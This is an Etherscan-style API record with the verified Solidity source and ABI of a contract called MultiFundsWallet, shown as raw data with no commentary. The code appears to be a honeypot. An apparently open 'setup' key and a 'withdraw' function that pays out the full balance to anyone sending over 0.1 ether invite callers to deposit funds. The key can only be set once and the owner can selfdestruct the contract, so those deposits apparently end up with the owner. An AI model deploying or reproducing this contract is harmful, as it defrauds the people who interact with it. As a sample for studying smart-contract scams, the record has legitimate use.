{"status": "1", "message": "OK", "result": [{"SourceCode": "pragma solidity ^0.4.24;\r\n\r\ncontract MultiFundsWallet\r\n{\r\n    bytes32 keyHash;\r\n    address owner;\r\n    \r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n \r\n    function setup(string key) public \r\n    {\r\n        if (keyHash == 0x0) {\r\n            keyHash = keccak256(abi.encodePacked(key));\r\n        }\r\n    }\r\n    \r\n    function withdraw(string key) public payable \r\n    {\r\n        require(msg.sender == tx.origin);\r\n        if(keyHash == keccak256(abi.encodePacked(key))) {\r\n            if(msg.value > 0.1 ether) {\r\n                msg.sender.transfer(address(this).balance);      \r\n            }\r\n        }\r\n    }\r\n    \r\n    function update(bytes32 _keyHash) public \r\n    {\r\n        if (keyHash == 0x0) {\r\n            keyHash = _keyHash;\r\n        }\r\n    }\r\n    \r\n    function clear() public \r\n    {\r\n        require(msg.sender == owner);\r\n        selfdestruct(owner);\r\n    }\r\n\r\n    function () public payable {\r\n        \r\n    }\r\n}", "ABI": "[{\"constant\":false,\"inputs\":[{\"name\":\"key\",\"type\":\"string\"}],\"name\":\"setup\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"key\",\"type\":\"string\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"clear\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_keyHash\",\"type\":\"bytes32\"}],\"name\":\"update\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]", "ContractName": "MultiFundsWallet", "CompilerVersion": "v0.4.24+commit.e67f0147", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://894f49ab5a12b1516a08ce1641ea0f35db8737b1f80fc1f37ac3d6a8cea9cf49"}]}